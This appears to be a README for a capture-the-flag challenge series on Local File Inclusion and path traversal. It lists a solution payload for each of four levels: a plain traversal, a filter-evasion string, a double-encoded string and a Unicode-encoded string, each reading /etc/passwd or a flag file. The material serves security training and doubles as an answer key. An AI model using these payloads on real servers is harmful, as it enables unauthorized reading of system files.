# 🛡️ LFI / Path Traversal CTF

This repository contains a custom Capture the Flag (CTF) challenge series focused on **Local File Inclusion (LFI)** and **Path Traversal** vulnerabilities. The CTF progresses in difficulty from basic file reads to advanced bypass techniques.

---

## 🔧 Requirements

- Browser or tools like `curl`/`BurpSuite`
- Basic understanding of:
  - URL encoding
  - File system traversal
  - Web application behavior (esp. Spring Boot for Level 3)

---

## 🚩 Levels & Payloads

### 📂 Level 1 — No Protection (Basic Traversal)
Straightforward file path traversal, no sanitization or filtering.

- **Payload**: `../../../../../../../etc/passwd`
- **Alternate**: `../flag.txt`

---

### 🧱 Level 2 — Filter Evasion via Slash Injection
Basic filtering in place for `"../"` patterns, but no normalization applied.

- **Payload**: `....//....//....//....//....//etc/passwd`

_This leverages how `....//` is interpreted as `../` after normalization._

---

### 🔒 Level 3 — Blacklisted Patterns (Double Encoding Bypass)
The application decodes the input twice. Blacklists are applied only after the first decoding pass (common in Spring Boot apps).

- **Payload**: `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564`

### 🌐 Level 4 — Unicode + URL Encoding Bypass
Strict sanitization blocks normal encoding. Use Unicode with URL encoding.

- **Payload**: `%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%36%35%5c%75%30%30%37%34%5c%75%30%30%36%33%5c%75%30%30%32%66%5c%75%30%30%37%30%5c%75%30%30%36%31%5c%75%30%30%37%33%5c%75%30%30%37%33%5c%75%30%30%37%37%5c%75%30%30%36%34`

- **Decoded Path**:
`\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc/passwd`

- **Note**: Exploits double decoding and Unicode parsing by some Java/Spring Boot servers.


## 🎯 Objective

In each level, your goal is to:

- Read the `/etc/passwd` file (on Linux-based servers)
- Or extract the `flag.txt` file